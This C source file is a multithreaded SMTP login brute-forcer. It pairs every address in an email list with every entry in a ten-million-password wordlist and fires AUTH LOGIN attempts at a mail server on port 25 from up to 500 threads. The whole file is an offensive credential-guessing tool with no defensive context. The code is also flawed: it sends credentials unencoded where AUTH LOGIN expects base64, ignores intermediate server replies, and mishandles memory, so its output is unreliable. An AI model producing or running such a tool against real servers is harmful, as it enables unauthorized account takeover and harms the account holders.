#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 25
#define BUFFER_SIZE 1024
#define MAX_THREADS 500

typedef struct {
    const char *email;
    const char *password;
} Attempt;

void *brute_force_attempt(void *arg) {
    Attempt *attempt = (Attempt *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Prepare the sockaddr_in structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection Failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Send email and password
    snprintf(buffer, sizeof(buffer), "EHLO client\r\n");
    send(sock, buffer, strlen(buffer), 0);

    snprintf(buffer, sizeof(buffer), "AUTH LOGIN\r\n");
    send(sock, buffer, strlen(buffer), 0);

    snprintf(buffer, sizeof(buffer), "%s\r\n", attempt->email);
    send(sock, buffer, strlen(buffer), 0);

    snprintf(buffer, sizeof(buffer), "%s\r\n", attempt->password);
    send(sock, buffer, strlen(buffer), 0);

    // Receive response
    bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes_received] = '\0';
    printf("Response for %s:%s - %s", attempt->email, attempt->password, buffer);

    close(sock);
    free(attempt);
    pthread_exit(NULL);
}

int main() {
    FILE *password_file = fopen("10-million.txt", "r");
    FILE *email_file = fopen("emails.txt", "r");
    if (!password_file || !email_file) {
        perror("File opening failed");
        exit(EXIT_FAILURE);
    }

    char email[BUFFER_SIZE];
    char password[BUFFER_SIZE];
    pthread_t threads[MAX_THREADS];
    int thread_count = 0;

    while (fgets(email, sizeof(email), email_file)) {
        email[strcspn(email, "\n")] = 0; // Remove newline character

        while (fgets(password, sizeof(password), password_file)) {
            password[strcspn(password, "\n")] = 0; // Remove newline character

            Attempt *attempt = malloc(sizeof(Attempt));
            attempt->email = strdup(email);
            attempt->password = strdup(password);

            if (pthread_create(&threads[thread_count], NULL, brute_force_attempt, attempt) < 0) {
                perror("Could not create thread");
                free(attempt->email);
                free(attempt->password);
                free(attempt);
                continue;
            }

            thread_count++;
            if (thread_count >= MAX_THREADS) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_join(threads[i], NULL);
                }
                thread_count = 0;
            }
        }

        rewind(password_file); // Reset password file pointer
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(password_file);
    fclose(email_file);
    return 0;
}